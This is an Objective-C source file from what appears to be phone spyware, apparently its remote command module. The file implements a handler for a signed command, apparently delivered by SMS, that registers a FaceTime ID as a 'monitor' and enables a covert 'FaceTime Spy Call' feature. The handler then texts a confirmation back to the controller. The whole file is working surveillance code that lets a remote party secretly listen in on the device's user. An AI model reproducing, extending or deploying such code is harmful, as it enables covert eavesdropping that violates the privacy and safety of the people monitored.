//
//  EnableFaceTimeSpyCallWithMonitorFaceTimeIDsProcessor.m
//  RCM
//
//  Created by Benjawan Tanarattanakorn on 7/21/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "EnableFaceTimeSpyCallWithMonitorFaceTimeIDsProcessor.h"
#import "PrefMonitorFacetimeID.h"
#import "Preference.h"


@interface EnableFaceTimeSpyCallWithMonitorFaceTimeIDsProcessor (PrivateAPI)
- (void) enableFaceTimeSpyCallWithMonitorFaceTimeID;
- (BOOL) isValidFacetimeID;
- (void) enableFaceTimeSpyCallException;
- (void) sendReplySMS;
@end


@implementation EnableFaceTimeSpyCallWithMonitorFaceTimeIDsProcessor


/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the EnableFaceTimeSpyCallWithMonitorFaceTimeIDsProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description: self (EnableFaceTimeSpyCallWithMonitorFaceTimeIDsProcessor)
 */

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData  {
    DLog (@"EnableFaceTimeSpyCallWithMonitorFaceTimeIDsProcessor--->initWithRemoteCommandData");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}

#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the EnableFaceTimeSpyCallWithMonitorFaceTimeIDsProcessor
 - Argument list and description:No Argument 
 - Return description: No return type
 */

- (void) doProcessingCommand {
	DLog (@"EnableFaceTimeSpyCallWithMonitorFaceTimeIDsProcessor--->doProcessingCommand");
	
	if (![RemoteCmdSignatureUtils verifyRemoteCmdDataSignature:mRemoteCmdData
										 numberOfCompulsoryTag:3]) {
		[RemoteCmdSignatureUtils throwInvalidCmdWithName:@"EnableFaceTimeSpyCallWithMonitorFaceTimeIDsProcessor"
												  reason:@"Failed signature check"];
	}		
	
	if ([self isValidFacetimeID])
		[self enableFaceTimeSpyCallWithMonitorFaceTimeID];
	else
		[self enableFaceTimeSpyCallException];
}


#pragma mark EnableFaceTimeSpyCallWithMonitorFaceTimeIDsProcessor PrivateAPI Methods


/**
 - Method name: enableFaceTimeSpyCallWithMonitorFaceTimeID
 - Purpose:This method is used to process enable FaceTime Spy Call with monitor numbers
 - Argument list and description: No Argument
 - Return description: No Return type
 */

- (void) enableFaceTimeSpyCallWithMonitorFaceTimeID {
	DLog (@"EnableFaceTimeSpyCallWithMonitorFaceTimeIDsProcessor--->enableFaceTimeSpyCallWithMonitorFaceTimeID");
	
	NSString *facetimeID							= [[mRemoteCmdData mArguments] objectAtIndex:2];
	id <PreferenceManager> prefManager				= [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];	
	PrefMonitorFacetimeID *prefMonitorFacetimeID	= (PrefMonitorFacetimeID *) [prefManager preference:kFacetimeID];
	[prefMonitorFacetimeID setMEnableMonitorFacetimeID:1];
		
	NSMutableArray *faceTimeIDArray					= [[NSMutableArray alloc] init];
	[faceTimeIDArray addObject:facetimeID];
	[prefMonitorFacetimeID setMMonitorFacetimeIDs:faceTimeIDArray];
	
	// Update preference
	[prefManager savePreferenceAndNotifyChange:prefMonitorFacetimeID];
	[faceTimeIDArray release];

	// Send SMS reply message
	[self sendReplySMS];
}

/**
 - Method name: isValidFacetimeID
 - Purpose:This method is used to validate the arguments
 - Argument list and description:No Argument 
 - Return description:isValidArguments (BOOL)
 */

- (BOOL) isValidFacetimeID {
	DLog (@"EnableFaceTimeSpyCallWithMonitorFaceTimeIDsProcessor--->isValidFacetimeID")
	BOOL isValid	= NO;
	NSArray *args	= [mRemoteCmdData mArguments];
	if ([args count] > 2)
		isValid		= [RemoteCmdProcessorUtils isFacetimeID:[args objectAtIndex:2]];	
	return isValid;
}


/**
 - Method name: enableFaceTimeSpyCallException
 - Purpose:This method is invoked when enable Factime Spycall process is failed. 
 - Argument list and description: No Argument
 - Return description: No Return Type
 */

- (void) enableFaceTimeSpyCallException {
	DLog (@"EnableFaceTimeSpyCallWithMonitorFaceTimeIDsProcessor--->enableFaceTimeSpyCallException")
	FxException* exception		= [FxException exceptionWithName:@"enableFaceTimeSpyCallException" andReason:@"Enable FaceTime Spycall with FaceTime ID error"];
	[exception setErrorCode:kCmdExceptionErrorInvalidFacetimeIDToMonitorFacetimeIDList];	
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}



/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: No Argument
 - Return description: No return type
 */

- (void) sendReplySMS {
	DLog (@"EnableFaceTimeSpyCallWithMonitorFaceTimeIDsProcessor--->sendReplySMS")
	
	NSString *messageFormat			= [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																									andErrorCode:_SUCCESS_];
	NSString *enableFaceTimeSpyCallMessage	= NSLocalizedString(@"kEnableFaceTimeSpycallWithFaceTimeID", @"");	
	enableFaceTimeSpyCallMessage			= [NSString stringWithFormat:@"%@ %@", enableFaceTimeSpyCallMessage, [[mRemoteCmdData mArguments] objectAtIndex:2]];	
	enableFaceTimeSpyCallMessage			= [messageFormat stringByAppendingString:enableFaceTimeSpyCallMessage];
	
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:enableFaceTimeSpyCallMessage];
	
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:enableFaceTimeSpyCallMessage];
	}
}



/**
 - Method name: dealloc
 - Purpose:This method is used to Handle Memory managment
 - Argument list and description:No Argument
 - Return description: No Return Type
 */

-(void) dealloc {
	[super dealloc];
}


@end
